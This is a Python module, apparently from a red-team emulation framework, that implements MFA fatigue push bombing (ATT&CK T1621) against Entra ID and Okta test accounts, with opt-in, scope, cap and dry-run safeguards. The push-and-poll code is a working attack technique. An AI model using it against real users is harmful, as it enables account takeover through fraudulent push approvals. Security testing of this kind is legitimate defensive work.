# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Bill Halpin
"""
MFA Fatigue / Push Bombing — T1621

Generates repeated MFA push notifications to enrolled test users to simulate
an attacker who has obtained a valid password and is attempting to get the
user to approve a fraudulent push request.

Supported MFA providers:
- Microsoft Entra ID (Device Code flow triggers an MFA push to enrolled devices)
- Okta (MFA factor challenge on /api/v1/authn → /api/v1/authn/factors/{factorId}/verify)

Emulation controls:
- Only targets scope.target_accounts
- Maximum push count is capped (default: 3 per account)
- Stops immediately if an approval is detected (reports as critical finding)
- Requires explicit opt-in via ctx.params["confirm_mfa_fatigue_test"] = True
"""
from __future__ import annotations

import json
import logging
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

from redgnat.orm.models import ResultStatus
from redgnat.techniques.base import Technique, TechniqueContext
from redgnat.techniques.identity.base import _jitter_sleep

logger = logging.getLogger(__name__)

_MAX_PUSHES_CAP = 10  # Hard cap — never more than this regardless of params


class MFAFatigueTechnique(Technique):
    """
    ATT&CK T1621 — Multi-Factor Authentication Request Generation.

    Sends repeated MFA push notifications to enrolled test users to test
    whether users will approve fraudulent push requests under sustained pressure.

    IMPORTANT: This technique requires explicit opt-in to prevent accidental
    disruption of real users. Set ctx.params["confirm_mfa_fatigue_test"] = True.

    Parameters (ctx.params)
    -----------------------
    confirm_mfa_fatigue_test : bool
        Must be True to proceed (safety gate).
    provider : str
        "entra" or "okta" (default: "entra").
    pushes_per_account : int
        Number of push notifications to send per account (max: 10).
    inter_push_delay_seconds : float
        Seconds between pushes (default: 5.0).
    password : str
        Valid password for the test account (required to trigger MFA challenge).
        This is the password of the test account, not a real user.
    """

    technique_id = "T1621"
    tactic = "credential-access"
    name = "MFA Fatigue / Push Bombing"
    emulation_only = True

    def execute(self, ctx: TechniqueContext) -> Any:
        # Safety gate: must be explicitly confirmed
        if not ctx.params.get("confirm_mfa_fatigue_test"):
            return self._blocked_result(
                ctx,
                "MFA fatigue test requires ctx.params['confirm_mfa_fatigue_test'] = True. "
                "This prevents accidental MFA push bombardment of real users.",
            )

        accounts = ctx.scope.target_accounts
        if not accounts:
            return self._blocked_result(ctx, "No target_accounts configured in scope")

        provider = ctx.params.get("provider", "entra")
        pushes_per_account = min(
            int(ctx.params.get("pushes_per_account", 3)), _MAX_PUSHES_CAP
        )
        inter_push_delay = float(ctx.params.get("inter_push_delay_seconds", 5.0))
        password = ctx.params.get("password", "")

        if not password:
            return self._blocked_result(
                ctx, "MFA fatigue test requires ctx.params['password'] (test account password)"
            )

        if ctx.scope.dry_run:
            return self._dry_run_result(
                ctx,
                f"Would send up to {pushes_per_account} MFA push(es) to "
                f"{len(accounts)} account(s) via {provider}",
            )

        from redgnat.config import RedGNATConfig
        cfg = RedGNATConfig()

        findings: list[dict] = []
        for account in accounts:
            self._check_scope_account(ctx.scope, account)
            result = self._run_push_sequence(
                cfg, provider, account, password, pushes_per_account, inter_push_delay
            )
            findings.append(result)

            if result.get("approved"):
                logger.critical(
                    "MFAFatigue: CRITICAL — test account %s APPROVED a push notification! "
                    "User is susceptible to MFA fatigue attacks. [run=%s]",
                    account,
                    ctx.run_id,
                )

        approved_count = sum(1 for f in findings if f.get("approved"))
        status = ResultStatus.SUCCESS if not approved_count else ResultStatus.DETECTED
        return self._make_result(ctx, status, findings)

    def _run_push_sequence(
        self,
        cfg: Any,
        provider: str,
        account: str,
        password: str,
        pushes: int,
        inter_delay: float,
    ) -> dict:
        results = []

        for i in range(pushes):
            logger.info(
                "MFAFatigue: push %d/%d to %s via %s", i + 1, pushes, account, provider
            )
            if provider == "entra":
                outcome = self._entra_push(cfg, account, password)
            elif provider == "okta":
                outcome = self._okta_push(cfg, account, password)
            else:
                outcome = {"error": f"Unknown provider: {provider}"}

            results.append(outcome)

            if outcome.get("approved"):
                break

            _jitter_sleep(inter_delay)

        approved = any(r.get("approved") for r in results)
        return {
            "account": account,
            "provider": provider,
            "pushes_sent": len(results),
            "approved": approved,
            "outcomes": results,
            "finding": (
                "CRITICAL: User approved MFA push — susceptible to fatigue attack"
                if approved
                else "User did not approve push — resistant to this technique"
            ),
        }

    @staticmethod
    def _entra_push(cfg: Any, account: str, password: str) -> dict:
        """Initiate a device code flow which triggers a push notification."""
        # Device code flow triggers an app notification on enrolled devices
        device_code_url = (
            f"https://login.microsoftonline.com/{cfg.entra_tenant_id}/oauth2/v2.0/devicecode"
        )
        data = urllib.parse.urlencode({
            "client_id": cfg.entra_client_id,
            "scope": "openid profile",
            "login_hint": account,
        }).encode()

        try:
            req = urllib.request.Request(device_code_url, data=data, method="POST")
            with urllib.request.urlopen(req, timeout=10) as resp:  # noqa: S310
                body = json.loads(resp.read())

            device_code = body.get("device_code", "")
            expires_in = int(body.get("expires_in", 300))
            interval = int(body.get("interval", 5))

            # Poll for approval (limited to 2 polls to detect quick approvals)
            token_url = (
                f"https://login.microsoftonline.com/{cfg.entra_tenant_id}/oauth2/v2.0/token"
            )
            for _ in range(min(2, expires_in // interval)):
                time.sleep(interval)
                poll_data = urllib.parse.urlencode({
                    "client_id": cfg.entra_client_id,
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "device_code": device_code,
                }).encode()
                try:
                    poll_req = urllib.request.Request(token_url, data=poll_data, method="POST")
                    with urllib.request.urlopen(poll_req, timeout=10) as poll_resp:  # noqa: S310
                        poll_body = json.loads(poll_resp.read())
                    if "access_token" in poll_body:
                        return {"approved": True, "provider": "entra", "account": account}
                except urllib.error.HTTPError as e:
                    err_body = json.loads(e.read().decode("utf-8", errors="replace") or "{}")
                    if err_body.get("error") not in {"authorization_pending", "slow_down"}:
                        break

            return {"approved": False, "provider": "entra", "account": account}

        except Exception as exc:
            return {"approved": False, "provider": "entra", "account": account, "error": str(exc)}

    @staticmethod
    def _okta_push(cfg: Any, account: str, password: str) -> dict:
        """Trigger an Okta MFA push via the primary auth endpoint."""
        authn_url = f"{cfg.okta_base_url.rstrip('/')}/api/v1/authn"
        payload = json.dumps({"username": account, "password": password}).encode()
        headers = {"Content-Type": "application/json", "Accept": "application/json"}

        try:
            req = urllib.request.Request(authn_url, data=payload, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:  # noqa: S310
                body = json.loads(resp.read())

            state_token = body.get("stateToken")
            if not state_token:
                return {"approved": False, "provider": "okta", "account": account}

            # Find a PUSH factor
            factors = body.get("_embedded", {}).get("factors", [])
            push_factor = next(
                (f for f in factors if f.get("factorType") == "push"), None
            )
            if not push_factor:
                return {
                    "approved": False,
                    "provider": "okta",
                    "account": account,
                    "note": "No push factor enrolled",
                }

            verify_url = push_factor["_links"]["verify"]["href"]
            verify_payload = json.dumps({"stateToken": state_token}).encode()
            verify_req = urllib.request.Request(
                verify_url, data=verify_payload, headers=headers
            )
            with urllib.request.urlopen(verify_req, timeout=15) as vresp:  # noqa: S310
                vbody = json.loads(vresp.read())

            approved = vbody.get("status") == "SUCCESS"
            return {"approved": approved, "provider": "okta", "account": account}

        except Exception as exc:
            return {"approved": False, "provider": "okta", "account": account, "error": str(exc)}
